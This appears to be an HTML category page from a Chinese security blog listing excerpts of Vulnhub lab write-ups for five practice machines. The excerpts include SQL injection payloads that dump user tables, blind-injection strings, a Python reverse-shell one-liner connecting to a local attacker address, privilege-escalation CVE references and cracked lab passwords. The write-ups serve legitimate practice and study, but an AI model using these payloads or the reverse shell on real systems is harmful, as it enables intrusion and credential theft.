@@ -1,0 +1,75 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Vulnhub | 养猪日记</title>
+<meta name=keywords content><meta name=description content="养猪日记"><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/categories/vulnhub/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://yangzhuzai.github.io/categories/vulnhub/index.xml><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/categories/vulnhub/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Vulnhub"><meta property="og:description" content="养猪日记"><meta property="og:type" content="website"><meta property="og:url" content="https://yangzhuzai.github.io/categories/vulnhub/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Vulnhub"><meta name=twitter:description content="养猪日记"></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><header class=page-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/categories/>Categories</a></div><h1>Vulnhub</h1></header><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>0x045 hackme</h2></header><div class=entry-content><p>端口扫描 渗透 注册一个账号：
+登录：
+这里说来惭愧，又是因为懒病，放弃了手动注入，：
+破解superadmin的密码：
+登录superadmin，发现上传框：
+提权 2021-4034
+SUID
+补一下手动注入：
+Security ’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=“webapphacking”#
+表名：webapphacking
+books,users
+列名：
+Security ’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’#
+USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,user,pasword,name,address
+Security ’ union select 1,2,group_concat(USER,’\n’,pasword) from users#
+...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;40 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0x045 hackme" href=https://yangzhuzai.github.io/posts/vulnhub/0x045-hackme/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>0x046 Born2Root</h2></header><div class=entry-content><p>还是向virtualbox妥协了，这次这个问题出现在导入的地方，不是很好解决
+端口扫描 渗透 发现有效信息：
+但是不知道用户名，只能把首页上的用户名都试试了：
+出现一个提示不支持的签名，这个之前遇到过，需要改一下配置文件：
+好像登录上去了：
+提权 这次提权有点意思，很多命令被禁用了，只手动挨个找，总于在查找计划任务时找到线索：
+先提权到jimmy用户吧：
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.104",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]); 发现SUID权限程序：
+但是使用了绝对路径，相关文件没有权限：
+后面无奈看了WP，结果还是爆破，当初直接爆破会不会更好呢，不同的是，这次cewl的密码本不太够了。实测john生成的不太好用，规则太死了：
+需要生成特定的社工字典：
+https://www.bugku.com/mima/
+然后爆破成功：
+这也是root密码：</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;21 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0x046 Born2Root" href=https://yangzhuzai.github.io/posts/vulnhub/0x046-born2root/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>0x047 Freshly</h2></header><div class=entry-content><p>这台也是用virtualbox打开的
+端口扫描 渗透 挨个端口来看吧：
+首先是80：
+疑似线索：
+tumblr_mdeo27ZZjB1r6pf3eo1_500.gif
+login.php存在sql注入，但是这种登录框一般是盲注，这里是布尔盲注，手动可能有点麻烦：
+443：
+发现wordpress了，先搞wordpress：
+插件：
+用户：
+通过插件查找漏洞，找到两个可能的：
+8080端口：
+只有80端口可以，看样子得写脚本了：
+写了半天，发现没有burp好使：
+测数据库长度： payload:
+admin ‘or length(database())=5#
+数据库长度为5
+测试数据库名：LOGIN substr(database(),1,1)=‘a’
+第一个字符：L
+admin ‘or substr(database(),1,1)=‘L’#
+burp操作如下：
+...</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;80 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0x047 Freshly" href=https://yangzhuzai.github.io/posts/vulnhub/0x047-freshly/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>0x048 Loly</h2></header><div class=entry-content><p>端口扫描 渗透 改一下hosts文件：
+wpscan扫描
+插件
+用户
+直接使用rockyou爆破得到密码：
+Username: loly, Password: fernando
+后台上传webshell，找了老半天了：
+路径：
+提权 提权到loly失败：
+通过查找网站的数据库密码，切换成功：
+lolyisabeautifulgirl
+本来是不想用内核提权的，找了半天好像没其他方式了：
+CVE-2017-16995</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;19 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0x048 Loly" href=https://yangzhuzai.github.io/posts/vulnhub/0x048-loly/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>0x049 Geisha</h2></header><div class=entry-content><p>端口扫描 渗透 所有端口都看了一下，几乎都是这个样子，还怪好看的嘞，但是下下来看了一下，没有发现什么隐藏信息：
+21端口：
+这样的话，就只剩一个22端口了，尝试爆破，由于啥信息都没有，就只能试试geisha了：
+大概跑了10多分钟，爆破出了密码为letmein
+提权 查看root密码：
+爆破hash:
+跑了20分钟了，都没跑成功：
+忘了能读密钥啊：</p></div><footer class=entry-footer><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;11 words&nbsp;·&nbsp;养猪日记</footer><a class=entry-link aria-label="post link to 0x049 Geisha" href=https://yangzhuzai.github.io/posts/vulnhub/0x049-geisha/></a></article><footer class=page-footer><nav class=pagination><a class=prev href=https://yangzhuzai.github.io/categories/vulnhub/page/9/>«&nbsp;Prev&nbsp;
+</a><a class=next href=https://yangzhuzai.github.io/categories/vulnhub/page/11/>Next&nbsp;&nbsp;»</a></nav></footer></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
